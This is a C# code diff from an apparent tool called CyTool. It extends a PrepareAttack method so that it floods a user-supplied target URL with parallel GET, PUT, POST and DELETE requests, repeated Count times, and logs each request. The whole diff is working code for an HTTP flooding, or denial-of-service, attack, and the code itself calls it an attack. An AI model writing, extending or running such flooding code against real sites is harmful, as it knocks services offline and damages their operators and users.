@@ -19,23 +19,104 @@ namespace CyTool.Models
 
         public List<Task> PrepareAttack()
         {
+
             if (string.IsNullOrEmpty(TargetUrl))
                 throw new InvalidOperationException("Target URL is required.");
 
-            var attacks = new List<Task>();
 
+
+            var attacks = new List<Task>();
+           
             Parallel.ForEach(Enumerable.Range(0, Count), i =>
             {
-                var attack = Task.Run(async () =>
+                try { 
+                var attackGet = Task.Run(async () =>
                 {
-                    await client.GetAsync(TargetUrl);
+                    try
+                    {
+                        await client.GetAsync(TargetUrl);
+                    }
+                    catch (Exception ex)
+                    {
+                        await Application.Current.Dispatcher.InvokeAsync(() =>
+                        {
+                            RequestLogs.Add($"GET failed {TargetUrl}");
+                        });
+                    }
                     await Application.Current.Dispatcher.InvokeAsync(() =>
                     {
-                        RequestLogs.Add($"Request sent to {TargetUrl}");
+                        RequestLogs.Add($"GET request sent to {TargetUrl}");
                     });
                 });
-                if (attack != null)
-                    attacks.Add(attack);
+                if (attackGet != null)
+                    attacks.Add(attackGet);
+
+                var attackPut = Task.Run(async () =>
+                {
+                    try { 
+                    await client.PutAsync(TargetUrl, new StringContent(""));
+                    }
+                    catch (Exception ex)
+                    {
+                        await Application.Current.Dispatcher.InvokeAsync(() =>
+                        {
+                            RequestLogs.Add($"PUT failed {TargetUrl}");
+                        });
+                    }
+                    await Application.Current.Dispatcher.InvokeAsync(() =>
+                    {
+                        RequestLogs.Add($"PUT request sent to {TargetUrl}");
+                    });
+                });
+                if (attackPut != null)
+                    attacks.Add(attackPut);
+
+                var attackPost = Task.Run(async () =>
+                {
+                    try { 
+                    await client.PostAsync(TargetUrl, new StringContent(""));
+                    }
+                    catch (Exception ex)
+                    {
+                        await Application.Current.Dispatcher.InvokeAsync(() =>
+                        {
+                            RequestLogs.Add($"POST failed {TargetUrl}");
+                        });
+                    }
+                    await Application.Current.Dispatcher.InvokeAsync(() =>
+                    {
+                        RequestLogs.Add($"POST request sent to {TargetUrl}");
+                    });
+                });
+                if (attackPost != null)
+                    attacks.Add(attackPost);
+
+                var attackDelete = Task.Run(async () =>
+                {
+                    try { 
+                    await client.DeleteAsync(TargetUrl);
+                    }
+                    catch (Exception ex)
+                    {
+                        await Application.Current.Dispatcher.InvokeAsync(() =>
+                        {
+                            RequestLogs.Add($"DELETE failed {TargetUrl}");
+                        });
+                    }
+
+                    await Application.Current.Dispatcher.InvokeAsync(() =>
+                    {
+                        RequestLogs.Add($"DELETE request sent to {TargetUrl}");
+                    });
+                });
+                    if (attackDelete != null)
+                        attacks.Add(attackDelete);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                }
+
             });
 
             return attacks;
